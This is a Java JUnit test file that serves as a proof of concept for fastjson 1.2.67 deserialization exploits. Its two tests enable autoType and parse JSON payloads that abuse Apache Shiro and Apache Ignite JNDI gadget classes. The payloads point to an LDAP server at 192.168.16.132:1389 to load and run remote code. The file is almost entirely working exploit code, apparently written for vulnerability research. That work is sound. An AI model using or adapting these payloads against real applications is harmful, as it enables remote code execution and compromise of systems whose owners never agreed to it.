import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;
import org.junit.Test;

public class fastjson_1_2_67 {
    @Test
    public void shiroDemo() {
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        String payload = "{\"@type\":\"org.apache.shiro.jndi.JndiObjectFactory\",\"resourceName\":\"ldap://192.168.16.132:1389/siflky\",\"instance\":{\"$ref\":\"$.instance\"}}";
        Object jsonObject = JSON.parseObject(payload);
    }

    @Test
    public void igniteDemo() {
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        String payload = "{\"@type\":\"org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup\", \"jndiNames\":[\"ldap://192.168.16.132:1389/siflky\"], \"tm\": {\"$ref\":\"$.tm\"}}";
        Object jsonObject = JSON.parseObject(payload);
    }

}
